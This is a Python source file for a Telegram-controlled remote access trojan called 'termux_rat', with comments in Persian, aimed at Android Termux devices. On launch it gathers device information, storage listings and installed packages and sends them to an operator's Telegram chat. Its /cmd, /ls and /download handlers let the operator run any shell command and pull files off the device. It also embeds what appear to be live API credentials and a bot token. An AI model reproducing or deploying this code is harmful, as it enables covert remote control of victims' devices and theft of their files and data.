from pyrogram import Client, filters
import os
import platform
import socket
import getpass
import uuid
import psutil
import json
from datetime import datetime
import subprocess
import time

# تنظیمات ربات - این مقادیر باید با اطلاعات واقعی شما جایگزین شوند
api_id = 22657077  # جایگزین با API ID واقعی از my.telegram.org
api_hash = "3809f12f3cc360269568a3e0170c771f"  # جایگزین با API Hash واقعی
bot_token = "8023344582:AAFx4vdcx75wJ05aFxbHYomQLIwUhdU1Yew"  # جایگزین با توکن ربات از @BotFather
admin_chat_id = 5914911468  # جایگزین با چت آیدی عددی شما (بدون کوتیشن)

app = Client(
    "termux_rat",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token
)

def get_system_info():
    """جمع آوری اطلاعات سیستم"""
    try:
        info = {
            "device": {
                "username": getpass.getuser(),
                "hostname": socket.gethostname(),
                "os": f"{platform.system()} {platform.release()}",
                "architecture": platform.machine(),
                "processor": platform.processor()
            },
            "storage": {
                "total": round(psutil.disk_usage('/').total / (1024**3), 2),
                "used": round(psutil.disk_usage('/').used / (1024**3), 2),
                "free": round(psutil.disk_usage('/').free / (1024**3), 2)
            },
            "network": {
                "ip": socket.gethostbyname(socket.gethostname()),
                "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                               for ele in range(0,8*6,8)][::-1])
            },
            "termux": {
                "storage": list_termux_storage(),
                "packages": list_installed_packages()
            },
            "timestamp": str(datetime.now())
        }
        return info
    except Exception as e:
        return {"error": str(e)}

def list_termux_storage():
    """لیست محتویات حافظه ترمکس"""
    try:
        return os.listdir("/sdcard")
    except:
        return "Storage access denied"

def list_installed_packages():
    """لیست پکیج های نصب شده"""
    try:
        packages = subprocess.check_output(["pkg", "list-installed"], shell=True)
        return packages.decode().splitlines()
    except:
        return "Package list not available"

def run_command(cmd):
    """اجرای دستور در ترمینال"""
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

@app.on_message(filters.command("start"))
def start(client, message):
    """شروع ربات و ارسال اطلاعات اولیه"""
    try:
        # ذخیره چت آیدی اگر اولین بار است
        global admin_chat_id
        admin_chat_id = message.chat.id
        
        info = get_system_info()
        with open("system_info.json", "w") as f:
            json.dump(info, f, indent=4)
        
        message.reply_text("✅ RAT Activated Successfully!")
        message.reply_document("system_info.json")
        os.remove("system_info.json")
    except Exception as e:
        message.reply_text(f"⚠️ Error: {str(e)}")

@app.on_message(filters.command("cmd"))
def execute_cmd(client, message):
    """اجرای دستورات دلخواه"""
    try:
        command = message.text.split(" ", 1)[1]
        output = run_command(command)
        
        if len(output) > 3000:
            with open("cmd_output.txt", "w") as f:
                f.write(output)
            message.reply_document("cmd_output.txt")
            os.remove("cmd_output.txt")
        else:
            message.reply_text(f"📋 Output:\n```\n{output}\n```", parse_mode="markdown")
    except IndexError:
        message.reply_text("ℹ️ Usage: /cmd <command>")

@app.on_message(filters.command("ls"))
def list_files(client, message):
    """لیست فایلهای دایرکتوری جاری"""
    try:
        path = message.text.split(" ")[1] if len(message.text.split()) > 1 else "."
        files = os.listdir(path)
        message.reply_text(f"📁 Files in {path}:\n" + "\n".join(files))
    except Exception as e:
        message.reply_text(f"❌ Error: {str(e)}")

@app.on_message(filters.command("download"))
def download_file(client, message):
    """دانلود فایل از دستگاه هدف"""
    try:
        file_path = message.text.split(" ", 1)[1]
        if os.path.exists(file_path):
            message.reply_document(file_path)
        else:
            message.reply_text("❌ File not found")
    except IndexError:
        message.reply_text("ℹ️ Usage: /download <file_path>")

def send_initial_message():
    """ارسال پیام اولیه پس از اتصال"""
    try:
        with app:
            # تاخیر برای اطمینان از اتصال
            time.sleep(5)
            
            # ارسال پیام به ادمین
            app.send_message(
                admin_chat_id,
                "🖥️ RAT Connected!\n"
                f"📱 Device: {socket.gethostname()}\n"
                f"📌 IP: {socket.gethostbyname(socket.gethostname())}\n"
                f"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            # ارسال اطلاعات سیستم
            info = get_system_info()
            with open("system_info.json", "w") as f:
                json.dump(info, f, indent=4)
            app.send_document(admin_chat_id, "system_info.json")
            os.remove("system_info.json")
    except Exception as e:
        print(f"Initial message failed: {e}")

# اجرای ربات
if __name__ == "__main__":
    # ارسال پیام اولیه در یک ترد جداگانه
    import threading
    threading.Thread(target=send_initial_message).start()
    
    # اجرای اصلی ربات
    app.run()
